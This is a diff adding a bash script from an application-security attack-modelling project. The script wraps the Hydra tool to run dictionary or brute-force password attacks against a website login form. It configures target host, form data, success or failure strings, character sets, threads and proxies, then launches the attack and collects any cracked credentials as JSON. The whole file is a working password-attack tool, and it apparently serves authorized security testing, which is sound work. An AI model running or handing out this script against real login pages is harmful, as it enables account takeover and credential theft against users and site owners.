@@ -1,0 +1,440 @@
+#!/usr/bin/env bash
+
+##
+## "Password Brute Force & Dictionary Attack" script to execute a
+## CAPEC-16 or a CAPEC-49 attack.
+##
+## Allows the user to provide various inputs to drive both dictionary-based
+## and brute force  attack against a website login form using the Hydra
+## attack software.  
+##
+## Application Security Threat Attack Modeling (ASTAM)
+##
+## Copyright (C) 2017 Applied Visions - http://securedecisions.com
+##
+## Written by Aspect Security - https://aspectsecurity.com
+##
+## Licensed under the Apache License, Version 2.0 (the "License");
+## you may not use this file except in compliance with the License.
+## You may obtain a copy of the License at
+##
+##     http://www.apache.org/licenses/LICENSE-2.0
+##
+## Unless required by applicable law or agreed to in writing, software
+## distributed under the License is distributed on an "AS IS" BASIS,
+## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+## See the License for the specific language governing permissions and
+## limitations under the License.
+##
+
+# Path or name of GNU GREP!  BSD/Mac GREP will not work
+# http://www.heystephenwood.com/2013/09/install-gnu-grep-on-mac-osx.html
+# update grepbin to /usr/local/bin/grep, ggrep, gnugrep, or etc...
+tmpgrep=`grep --version 2>&1 | grep -i gnu`
+if [[ ! -z "$tmpgrep" ]]; then
+  grepbin=grep
+else
+  grepbin=ggrep
+fi
+
+# The Mac is missing "readlink -f", so use this instead
+# http://stackoverflow.com/questions/1055671/how-can-i-get-the-behavior-of-gnus-readlink-f-on-a-mac
+function get_realpath() {
+  [[ ! -f "$1" ]] && return 1 # failure : file does not exist.
+  [[ -n "$no_symlinks" ]] && local pwdp='pwd -P' || local pwdp='pwd' # do symlinks.
+  echo "$( cd "$( echo "${1%/*}" )" 2>/dev/null; $pwdp )"/"${1##*/}" # echo result.
+  return 0 # success
+}
+
+topDir=$(dirname $(get_realpath $BASH_SOURCE))
+
+if [[ -f ${topDir}/hydra && -x ${topDir}/hydra ]] ; then
+  hydrabin=${topDir}/hydra
+elif [[ -f /opt/hydra/hydra && -x /opt/hydra/hydra ]] ; then
+  hydrabin=/opt/hydra/hydra
+elif [[ -e ./hydra && -x ./hydra ]] ; then
+  hydrabin=./hydra
+else
+  hydrabin=hydra
+fi
+
+
+# where to write tmp files, dir must exist, add $$ for PID.
+# examples: /tmp/crydra-$$-  or  ./tmp-$$-
+TMPPRE=/tmp/crydra-tmp-$$
+
+function printHelp {
+  echo "Usage: `basename $1` attackfile resultsfile"
+  echo "  -k: keep temporary files"
+  echo "  -D: debug setup, implies -k -v, hydra starts and is killed"
+  echo "  -v: verbose"
+  echo "  -h: help"
+  exit 1
+}
+
+function fatalError {
+  echo "ERROR: $1" 1>&2
+  exit 1
+}
+
+function say {
+  if [[ $verbose ]]; then
+    echo "$@"
+  fi
+}
+
+function progress {
+  if [[ $verbose ]]; then
+    echo -ne "$@"
+  fi
+}
+
+function progressCR {
+  if [[ $verbose ]]; then
+    echo -ne "$@" '\r'
+  fi
+}
+
+# global variables
+topDir=`dirname "$0"`
+
+# anything on the command line?
+if [[ $# -eq 0 ]]; then
+  printHelp $0
+fi
+
+# parse options
+OPTIND=1
+while getopts "kDvh" opt; do
+  case "$opt" in
+    k)
+      keeptemp=1
+      ;;
+    v)
+      verbose=1
+      ;;
+    D)
+      verbose=1
+      DEBUG_SETUP=1
+      ;;
+    *)
+      printHelp $0
+      ;;
+  esac
+done
+shift $((OPTIND-1))
+
+if [[ $# -ne 2 ]]; then
+  printHelp $0
+fi
+attackfile=$1
+resultsFile=$2
+
+# do we have attack configuration?
+if [[ -z $attackfile ]]; then
+  fatalError "attackfile must be specified"
+fi
+if [[ ! -f $attackfile ]]; then
+  fatalError "$attackfile does not exist"
+fi
+if [[ ! -r $attackfile ]]; then
+  fatalError "$attackfile cannot be read"
+fi
+if [[ -z $resultsFile ]]; then
+  # technically, we'll never get to this line of code.
+  fatalError "resultsFile must be specified"
+fi
+
+say "loading attack configuration file ($attackfile)..."
+. "$attackfile"
+
+
+threads=${threads:-6}
+throttle=${throttle:-0}
+
+## TODO FUTURE ....
+if [ ! -z "$maxruntime" ]; then
+  runprefix="timeout $maxruntime"
+fi
+
+
+port=${port:-80}
+method=${method:-POST}
+#   method=${method^^}    ; # booo... bash v4 only.   :-(
+
+# TODO FUTURE also check $authstyle and figure out basic auth, etc.
+if [[ $method == "POST" ]]; then
+  hydramethod="http-post-form"
+elif [[ $method == "GET" ]]; then
+  hydramethod="http-get-form"
+else
+  fatalError "Method must be GET or POST"
+fi
+
+
+if [[ ${useTLS:-0} -eq 0 ]]; then
+  tlsFlag=""
+else
+  tlsFlag="-S"
+fi
+
+if [[ -z $username ]]; then
+  fatalError "Username must be specified"
+fi
+if [[ -z $host ]]; then
+  fatalError "Hostname or IP address must be specified"
+fi
+
+
+# payload = uripath : Formdata : S or F : optional cookies
+
+if [[ -z $uripath ]]; then
+  fatalError "URI Path is missing"
+fi
+
+# prefix the : with a \
+uripath=$(echo $uripath | sed 's/:/\\:/')
+
+if [[ -z $formdata ]]; then
+  fatalError "Form Data for POST/GET is missing"
+fi
+
+# prefix the : with a \
+formdata=$(echo $formdata | sed 's/:/\\:/')
+
+if [[ -z $msgsuccess && -z $msgfailure ]]; then
+  fatalError "Must specify the Success message or Failure message"
+fi
+
+if [[ -n $msgsuccess && -n $msgfailure ]]; then
+  fatalError "Cannot specify both Success and Failure message, pick one"
+fi
+
+if [[ -n $msgsuccess ]]; then
+  msgcheck="S=$msgsuccess"
+fi
+if [[ -n $msgfailure ]]; then
+  msgcheck="F=$msgfailure"
+fi
+
+# prefix the : with a \
+msgcheck=$(echo $msgcheck | sed 's/:/\\:/')
+
+### TODO FUTURE : Insert Cookie and Header processing here.
+
+# this isn't actually used due to parameter re-expasion, but this is what the Hydra payload would be.
+payload="${uripath}:${formdata}:${msgcheck}"
+
+# ADVANCED: you can manually set HYDRA_PROXY or HYDRA_PROXY_HTTP instead.  If so,
+# the attack file's settings will not be processed.
+if [[ -n $HYDRA_PROXY  ||  -n $HYDRA_PROXY_HTTP  ]]; then
+  say 'Environment variable for $HYDRA_PROXY or $HYDRA_PROXY_HTTP detected, using those values'
+elif [[ -n $proxyhost ]]; then
+  if [[ ${useTLS:-0} -eq 0 ]]; then
+    proxyscheme="http://"
+    proxyport=${proxyport:-80}
+  else
+    proxyscheme="https://"
+    proxyport=${proxyport:-443}
+  fi
+
+  proxycreds=""
+  if [[ -n $proxyuser ]]; then
+    proxycreds="${proxyuser}"
+
+    if [[ -n $proxypass ]]; then
+      proxycreds="${proxycreds}:${proxypass}"
+    fi
+    proxycreds="${proxycreds}@"
+  fi
+
+  proxyvalue="$proxyscheme$proxycreds$proxyhost:$proxyport/"
+  export HYDRA_PROXY_HTTP=${proxyvalue}
+
+  if [[ -n $proxypass ]]; then
+    say "Using proxy of $proxyscheme$proxyuser:XXXXXX@$proxyhost:$proxyport/"
+  else
+    say "Using proxy of ${HYDRA_PROXY_HTTP}"
+  fi
+fi
+
+## Hydra has "-e" with options n/s/r for these
+ensr=''
+if [[ -n $testreverse && $testreverse != "0" ]]; then
+  ensr="r$ensr"
+fi
+if [[ -n $testblank && $testblank != "0" ]]; then
+  ensr="n$ensr"
+fi
+if [[ -n $testpassisuser && $testpassisuser != "0" ]]; then
+  ensr="s$ensr"
+fi
+if [[ -n $ensr ]]; then
+  ensr="-e $ensr"
+fi
+
+## TODO FUTURE: Can support multiple users, just need to enhance this.
+userlistfile=${TMPPRE}-userlist.txt
+echo $username > ${userlistfile}
+
+
+passlist=''
+if [[ -z $dictionaryfile && ( -z $usebrute || $usebrute == "0" ) ]]; then
+  fatalError "Must specify a dictionary file to use or to do brute forces"
+fi
+
+if [[ -n $dictionaryfile && ( -n $usebrute && $usebrute != "0" ) ]]; then
+  fatalError "Cannot specify both Dictionary or Brute force"
+fi
+
+# try $dictionaryfile or $topDir/$dictionaryfile.  This way, you can specify 
+# local name or full path.
+if [[ -n $dictionaryfile ]]; then
+  if [[ ! -r $dictionaryfile ]]; then
+    df=${topDir}/${dictionaryfile}
+    if [[ ! -r $df ]]; then
+      fatalError "Cannot read Dictionary file ${dictionaryfile} or ${df}"
+    else
+      dictionaryfile=${df}
+    fi
+  fi
+  passlist="${dictionaryfile}"
+  passflag="-P"
+fi
+
+if [[ -n $usebrute && $usebrute != "0" ]]; then
+  if [[ $passminlength -lt 1 ]]; then
+    fatalError "passminlength must be greater than 0"
+  fi
+  if [[ -z $passmaxlength ]]; then
+    fatalError "passmaxlength must be specified"
+  fi
+  if [[ $passminlength -gt $passmaxlength ]]; then
+    fatalError "passminlength must be less than passmaxlength"
+  fi
+
+  brutechar=""
+  if [[ -n $useuppercase && $useuppercase != "0" ]]; then
+    brutechar=${brutechar}A
+  fi
+  if [[ -n $uselowercase && $uselowercase != "0" ]]; then
+    brutechar=${brutechar}a
+  fi
+  if [[ -n $usenumbers && $usenumbers != "0" ]]; then
+    brutechar=${brutechar}1
+  fi
+  if [[ -n $otherchars ]]; then
+    brutechar="${brutechar}${otherchars}"
+  fi
+  if [[ -z $brutechar ]]; then
+    fatalError "Brute force testing requires some character classes be specified"
+  fi
+
+  passlist="${passminlength}:${passmaxlength}:${brutechar}"
+  passflag="-x"
+fi
+
+
+stdoutfile=${TMPPRE}-stdout.log
+stderrfile=${TMPPRE}-stderr.log
+teefile=${TMPPRE}-tee.log
+resfile=${TMPPRE}-results.json
+
+# -I == ignores the crash recovery file, -R continues.  Generally, we want -I for our tests.
+# -V == show user+pass attempts. This is used to check the running process status
+mostopts="-I -V -o ${resfile} -b jsonv1 -s ${port} -L ${userlistfile} -t ${threads} -W ${throttle} ${tlsFlag}  ${ensr} "
+
+rm -f hydra.restore  ; # Delete restore file, otherwise we get stderr notice about it, even with -I
+
+# from above.... payload="${uripath}:${formdata}:${msgcheck}"
+
+#echo hydra $opts $host $hydramethod "${payload}"
+#echo $payload | sed 's/ /\\ /'
+#hydra $opts $host $hydramethod "$(echo $payload )" > ${teefile}  2>&1  &
+
+
+${hydrabin} $mostopts -d $passflag "${passlist}" \
+      $host $hydramethod "${uripath}:${formdata}:${msgcheck}" \
+   | tee ${teefile} > ${stdoutfile} 2> ${stderrfile} &
+
+hydraPID=$!
+
+# check initial status
+sleep 2  ;# sometimes, 1 second is not enough
+${grepbin} 'ATTEMPT\] target' ${teefile} > /dev/null 2>&1
+status=$?
+
+if [[ -n $DEBUG_SETUP && "0" != $DEBUG_SETUP ]]; then
+    # FIXME bug in debug mode, the kill does not work correctly.
+    kill $hydraPID
+    echo "#### ENV:"
+    env
+    echo
+    echo "#### Normal Vars:"
+    set
+    echo
+    echo "#### Command Line Should Be:"
+    echo ${runprefix}  ${hydrabin} $mostopts $passflag \"${passlist}\" \
+      $host $hydramethod \"${uripath}:${formdata}:${msgcheck}\" \
+      \| tee ${teefile} \> ${stdoutfile} 2\> ${stderrfile} \&
+    echo
+    echo "#### JSON File (incomplete):"
+    cat ${resfile}
+    exit 1
+fi
+
+if [[ 0 -ne $status ]]; then
+    fatalError "Hydra did not start up properly, check configuration."
+fi
+
+status=1
+
+### Notes on stdout.  Hydra produces the following data periodically while the system is running:
+# [STATUS] 42.00 tries/min, 42 tries in 00:01h, 20 to do in 00:01h, 2 active
+# [RE-ATTEMPT] target 127.0.0.1 - login "bixll@example.com" - pass "def" - 6 of 14 [child 1] (0/2)
+# [REDO-ATTEMPT] target 127.0.0.1 - login "bixll@example.com" - pass "bill" - 25 of 25 [child 0] (13/13)
+# [ERROR] Child with pid 75209 terminating, cannot connect
+# [ATTEMPT] target 127.0.0.1 - login "bixll@example.com" - pass "bill" - 12 of 20 [child 2] (0/8)
+#
+## If there is a success, it is this line:
+# [9999][http-post-form] host: 127.0.0.1   login: bill@example.com   password: bill
+#
+## The penultimate line in output is one of these type items:
+# 1 of 1 target completed, 0 valid passwords found
+# 1 of 1 target successfully completed, 1 valid password found
+#
+## The final line is this:
+# Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-28 16:30:12
+
+# wait for task to complete
+while [[ 0 -ne $status ]]; do
+  sleep 1
+
+  # TODO Perhaps we print warnings here?
+  # ${grepbin} '\[ERROR\] Child with pid \d* terminating, cannot connect'
+
+  # maybe do this instead????
+  # [STATUS] 42.00 tries/min, 42 tries in 00:01h, 20 to do in 00:01h, 2 active
+
+  percent=`tail -10 ${teefile} | ${grepbin} -Po 'ATTEMPT\] target .*\K \d+ of \d+ \[child \d+\] \(\d+/\d+\)' | tail -1`
+  progressCR progress: $percent
+
+  tmp=`${grepbin} 'Hydra .* finished at .*' ${teefile}`
+  status=$?
+  #echo grep: $status // $tmp
+done
+
+say ""
+say "attack complete"
+
+mv -f ${resfile} ${resultsFile}
+if [[ $? -ne 0 ]]; then
+  fatalError "Could not move temp results file ${resfile} to final destination; all temp files will remain intact."
+fi
+
+# clean up
+if [[ -z $keeptemp ]]; then
+  rm -f ${TMPPRE}*
+fi
+
+# vim: sw=2:ts=50:sts=2
